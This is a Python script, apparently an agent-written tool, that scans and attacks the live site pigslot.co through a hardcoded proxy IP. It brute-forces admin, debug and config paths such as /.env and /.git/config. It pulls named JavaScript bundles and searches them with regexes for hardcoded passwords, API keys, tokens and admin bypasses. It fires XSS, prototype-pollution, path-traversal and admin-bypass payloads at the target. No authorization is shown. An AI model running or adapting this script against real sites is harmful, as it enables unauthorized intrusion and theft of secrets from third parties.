#!/usr/bin/env python3

import json
import re
import requests
import urllib3
from urllib.parse import urljoin

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ZAP_PROXY_HOST = '46.202.177.106'
ZAP_PROXY_PORT = 8080
TARGET_URL = "https://pigslot.co/"

PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")
def print_critical(message): print(f"\033[1;35m[!!!] {message}\033[0m")

class CriticalVulnerabilityExtractor:
    def __init__(self):
        self.session = requests.Session()
        self.session.proxies = PROXIES
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
    def load_report(self):
        """Load the comprehensive report"""
        try:
            with open('/workspace/comprehensive_js_debug_report.json', 'r') as f:
                return json.load(f)
        except Exception as e:
            print_error(f"Error loading report: {e}")
            return None
    
    def extract_critical_vulnerabilities(self, report):
        """Extract only critical and high-risk vulnerabilities"""
        print_critical("🚨 EXTRACTING CRITICAL VULNERABILITIES")
        print_info("=" * 60)
        
        critical_vulns = []
        high_vulns = []
        secrets_found = []
        debug_endpoints = []
        
        for analysis in report.get('analyses', []):
            url = analysis.get('url', 'Unknown')
            
            # Check for secrets
            if analysis.get('secrets'):
                for secret in analysis['secrets']:
                    secrets_found.append({
                        'file': url,
                        'type': secret.get('type'),
                        'match': secret.get('match'),
                        'severity': 'CRITICAL'
                    })
            
            # Check for debug information
            if analysis.get('debug_info'):
                for debug in analysis['debug_info']:
                    if any(pattern in debug.get('match', '').lower() for pattern in ['password', 'secret', 'key', 'token']):
                        debug_endpoints.append({
                            'file': url,
                            'debug_info': debug.get('match'),
                            'severity': 'HIGH'
                        })
        
        # Check for high-severity vulnerabilities
        for vuln in report.get('vulnerabilities', []):
            severity = vuln.get('severity', 'low')
            if severity in ['critical', 'high']:
                if severity == 'critical':
                    critical_vulns.append(vuln)
                else:
                    high_vulns.append(vuln)
        
        return {
            'critical_vulns': critical_vulns,
            'high_vulns': high_vulns,
            'secrets_found': secrets_found,
            'debug_endpoints': debug_endpoints
        }
    
    def test_specific_admin_endpoints(self):
        """Test specific admin and debug endpoints that might be exploitable"""
        print_critical("🎯 TESTING SPECIFIC ADMIN/DEBUG ENDPOINTS")
        print_info("=" * 60)
        
        # Comprehensive list of potential admin/debug endpoints
        test_endpoints = [
            # Admin endpoints
            '/admin',
            '/admin/',
            '/admin/login',
            '/admin/dashboard',
            '/admin/config',
            '/admin/users',
            '/admin/settings',
            '/admin/debug',
            '/admin/api',
            '/admin-force',
            '/admin-panel',
            '/admin_panel',
            '/administration',
            '/manage',
            '/manager',
            '/control',
            '/console',
            
            # API admin endpoints
            '/api/admin',
            '/api/admin/',
            '/api/admin/login',
            '/api/admin/config',
            '/api/admin/users',
            '/api/admin/debug',
            '/api/v1/admin',
            '/api/v2/admin',
            
            # Debug endpoints
            '/debug',
            '/debug/',
            '/debug/info',
            '/debug/config',
            '/debug/status',
            '/debug/vars',
            '/debug/dump',
            '/debug/trace',
            '/.debug',
            '/dbg',
            
            # Config endpoints
            '/config',
            '/config.json',
            '/config.php',
            '/configuration',
            '/.env',
            '/env',
            '/environment',
            
            # Development endpoints
            '/dev',
            '/development',
            '/staging',
            '/test',
            '/testing',
            '/.git/config',
            '/package.json',
            '/composer.json',
            
            # Game-specific endpoints
            '/game/admin',
            '/game/debug',
            '/game/config',
            '/slot/admin',
            '/slot/debug',
            
            # Common files
            '/robots.txt',
            '/sitemap.xml',
            '/crossdomain.xml',
            '/clientaccesspolicy.xml',
            '/wp-config.php',
            '/web.config',
            '/.htaccess',
            
            # Next.js specific
            '/_next/static/chunks/admin',
            '/_next/webpack-hmr',
            '/_next/debug',
            '/_error',
            '/_debug',
        ]
        
        exploitable_endpoints = []
        
        for endpoint in test_endpoints:
            try:
                test_url = urljoin(TARGET_URL, endpoint)
                response = self.session.get(test_url, timeout=5, allow_redirects=False)
                
                status = response.status_code
                size = len(response.text)
                
                # Check for interesting responses
                if status in [200, 401, 403, 500]:
                    content_lower = response.text.lower()
                    
                    # Look for sensitive indicators
                    sensitive_indicators = [
                        'password', 'token', 'secret', 'key', 'config',
                        'database', 'admin', 'debug', 'error', 'stack',
                        'username', 'login', 'auth', 'credential', 'api_key',
                        'connection', 'mysql', 'postgres', 'mongodb', 'redis'
                    ]
                    
                    found_indicators = [ind for ind in sensitive_indicators if ind in content_lower]
                    
                    if found_indicators or status == 200:
                        # Additional checks for false positives
                        if not any(fp in content_lower for fp in ['404', 'not found', 'file not found']):
                            exploitable_endpoints.append({
                                'endpoint': test_url,
                                'status': status,
                                'size': size,
                                'indicators': found_indicators,
                                'content_preview': response.text[:500] if size < 10000 else response.text[:500] + "..."
                            })
                            
                            if found_indicators:
                                print_warning(f"🚨 {test_url} - Status: {status}, Indicators: {', '.join(found_indicators)}")
                            elif status == 200:
                                print_info(f"📄 {test_url} - Status: {status}, Size: {size}")
                
            except Exception as e:
                continue
        
        return exploitable_endpoints
    
    def deep_analyze_js_files(self):
        """Deep analysis of specific JS files for exploitable patterns"""
        print_critical("🔍 DEEP ANALYSIS OF JAVASCRIPT FILES")
        print_info("=" * 60)
        
        # Focus on specific files that are most likely to contain vulnerabilities
        target_files = [
            'https://pigslot.co/_next/static/chunks/pages/admin-force-c06ca2711d7847b2.js',
            'https://pigslot.co/_next/static/chunks/pages/_app-5397473a77dbf94e.js',
            'https://pigslot.co/_next/static/5dE1rQdPu6-h1mEs-Aohy/_buildManifest.js',
        ]
        
        critical_findings = []
        
        for file_url in target_files:
            try:
                response = self.session.get(file_url, timeout=10)
                if response.status_code == 200:
                    content = response.text
                    print_info(f"📁 Analyzing: {file_url}")
                    print_info(f"   Size: {len(content)} bytes")
                    
                    # Look for critical patterns
                    critical_patterns = [
                        # Hardcoded credentials
                        (r'password\s*[:=]\s*["\'][^"\']{3,}["\']', 'HARDCODED_PASSWORD'),
                        (r'api[_-]?key\s*[:=]\s*["\'][^"\']{10,}["\']', 'HARDCODED_API_KEY'),
                        (r'secret[_-]?key\s*[:=]\s*["\'][^"\']{10,}["\']', 'HARDCODED_SECRET'),
                        (r'token\s*[:=]\s*["\'][^"\']{20,}["\']', 'HARDCODED_TOKEN'),
                        
                        # Admin functions with potential bypasses
                        (r'function\s+.*admin.*\s*\([^)]*\)\s*\{[^}]*return\s+true', 'ADMIN_BYPASS'),
                        (r'isAdmin\s*[:=]\s*function[^}]*return\s+true', 'ADMIN_BYPASS'),
                        (r'checkAdmin\s*[:=]\s*function[^}]*return\s+true', 'ADMIN_BYPASS'),
                        
                        # Dangerous functions
                        (r'eval\s*\([^)]*\)', 'CODE_INJECTION'),
                        (r'Function\s*\([^)]*\)', 'CODE_INJECTION'),
                        (r'setTimeout\s*\(\s*["\'][^"\']*["\']', 'CODE_INJECTION'),
                        (r'setInterval\s*\(\s*["\'][^"\']*["\']', 'CODE_INJECTION'),
                        
                        # XSS patterns
                        (r'innerHTML\s*[=+]\s*[^;]*\+', 'XSS_VULNERABILITY'),
                        (r'document\.write\s*\([^)]*\+', 'XSS_VULNERABILITY'),
                        
                        # Debug flags
                        (r'debug\s*[:=]\s*true', 'DEBUG_ENABLED'),
                        (r'DEBUG\s*[:=]\s*true', 'DEBUG_ENABLED'),
                        (r'DEVELOPMENT\s*[:=]\s*true', 'DEBUG_ENABLED'),
                    ]
                    
                    for pattern, vuln_type in critical_patterns:
                        matches = re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE)
                        for match in matches:
                            context_start = max(0, match.start() - 100)
                            context_end = min(len(content), match.end() + 100)
                            context = content[context_start:context_end]
                            
                            critical_findings.append({
                                'file': file_url,
                                'vulnerability_type': vuln_type,
                                'pattern': pattern,
                                'match': match.group(),
                                'context': context,
                                'position': match.start(),
                                'severity': 'CRITICAL' if vuln_type in ['HARDCODED_PASSWORD', 'HARDCODED_SECRET', 'ADMIN_BYPASS'] else 'HIGH'
                            })
                            
                            print_warning(f"⚠️  {vuln_type}: {match.group()[:50]}...")
                    
            except Exception as e:
                print_error(f"Error analyzing {file_url}: {e}")
        
        return critical_findings
    
    def test_client_side_attacks(self):
        """Test client-side attack vectors"""
        print_critical("🧪 TESTING CLIENT-SIDE ATTACK VECTORS")
        print_info("=" * 60)
        
        # Test for DOM-based vulnerabilities
        test_payloads = [
            # XSS payloads
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '"><script>alert("XSS")</script>',
            
            # Prototype pollution
            '{"__proto__":{"polluted":true}}',
            'constructor.prototype.polluted=true',
            
            # Path traversal
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            
            # Admin bypass attempts
            '?admin=true',
            '?debug=1',
            '?isAdmin=1',
            '?role=admin',
        ]
        
        vulnerable_endpoints = []
        
        # Test main site with payloads
        for payload in test_payloads:
            try:
                # Test as URL parameter
                test_url = f"{TARGET_URL}?test={payload}"
                response = self.session.get(test_url, timeout=5)
                
                if payload in response.text:
                    vulnerable_endpoints.append({
                        'endpoint': test_url,
                        'vulnerability': 'REFLECTED_XSS',
                        'payload': payload,
                        'severity': 'HIGH'
                    })
                    print_warning(f"🚨 Reflected XSS: {payload}")
                
            except Exception as e:
                continue
        
        return vulnerable_endpoints
    
    def generate_critical_report(self):
        """Generate comprehensive critical vulnerability report"""
        print_critical("📊 GENERATING CRITICAL VULNERABILITY REPORT")
        print_info("=" * 60)
        
        # Load existing report
        full_report = self.load_report()
        
        # Extract critical vulnerabilities
        critical_analysis = self.extract_critical_vulnerabilities(full_report) if full_report else {
            'critical_vulns': [], 'high_vulns': [], 'secrets_found': [], 'debug_endpoints': []
        }
        
        # Test specific endpoints
        exploitable_endpoints = self.test_specific_admin_endpoints()
        
        # Deep analysis of JS files
        js_critical_findings = self.deep_analyze_js_files()
        
        # Test client-side attacks
        client_side_vulns = self.test_client_side_attacks()
        
        # Compile final report
        final_report = {
            'summary': {
                'critical_vulnerabilities': len(critical_analysis['critical_vulns']),
                'high_vulnerabilities': len(critical_analysis['high_vulns']),
                'secrets_found': len(critical_analysis['secrets_found']),
                'exploitable_endpoints': len(exploitable_endpoints),
                'js_critical_findings': len(js_critical_findings),
                'client_side_vulns': len(client_side_vulns)
            },
            'critical_vulnerabilities': critical_analysis['critical_vulns'],
            'high_vulnerabilities': critical_analysis['high_vulns'],
            'secrets_found': critical_analysis['secrets_found'],
            'exploitable_endpoints': exploitable_endpoints,
            'js_critical_findings': js_critical_findings,
            'client_side_vulnerabilities': client_side_vulns,
            'debug_endpoints': critical_analysis['debug_endpoints']
        }
        
        return final_report

def main():
    print_critical("🎯 CRITICAL VULNERABILITY EXTRACTOR & LIVE TESTER")
    print_info("Target: https://pigslot.co")
    print_info("=" * 70)
    
    extractor = CriticalVulnerabilityExtractor()
    report = extractor.generate_critical_report()
    
    # Print summary
    print_critical("📊 CRITICAL VULNERABILITY SUMMARY")
    print_info("=" * 50)
    print_info(f"🚨 Critical Vulnerabilities: {report['summary']['critical_vulnerabilities']}")
    print_info(f"⚠️  High Vulnerabilities: {report['summary']['high_vulnerabilities']}")
    print_info(f"🔑 Secrets Found: {report['summary']['secrets_found']}")
    print_info(f"🎯 Exploitable Endpoints: {report['summary']['exploitable_endpoints']}")
    print_info(f"🔍 JS Critical Findings: {report['summary']['js_critical_findings']}")
    print_info(f"🧪 Client-Side Vulns: {report['summary']['client_side_vulns']}")
    
    # Show critical findings
    if report['summary']['critical_vulnerabilities'] > 0:
        print_critical("💥 CRITICAL VULNERABILITIES FOUND!")
        for vuln in report['critical_vulnerabilities']:
            print_error(f"🔥 {vuln.get('type', 'Unknown')}: {vuln.get('pattern', 'No pattern')}")
    
    if report['summary']['secrets_found'] > 0:
        print_critical("🔑 SECRETS FOUND!")
        for secret in report['secrets_found']:
            print_error(f"🔥 {secret['type']}: {secret['match'][:50]}...")
    
    if report['summary']['exploitable_endpoints'] > 0:
        print_critical("🎯 EXPLOITABLE ENDPOINTS FOUND!")
        for endpoint in report['exploitable_endpoints']:
            print_error(f"🔥 {endpoint['endpoint']} - Status: {endpoint['status']}")
            if endpoint['indicators']:
                print_error(f"   Indicators: {', '.join(endpoint['indicators'])}")
    
    if report['summary']['js_critical_findings'] > 0:
        print_critical("🔍 CRITICAL JS FINDINGS!")
        for finding in report['js_critical_findings']:
            print_error(f"🔥 {finding['vulnerability_type']}: {finding['match'][:50]}...")
    
    # Save critical report
    with open('/workspace/CRITICAL_VULNERABILITY_REPORT.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    print_info("📄 Critical report saved to: CRITICAL_VULNERABILITY_REPORT.json")
    
    return report

if __name__ == "__main__":
    main()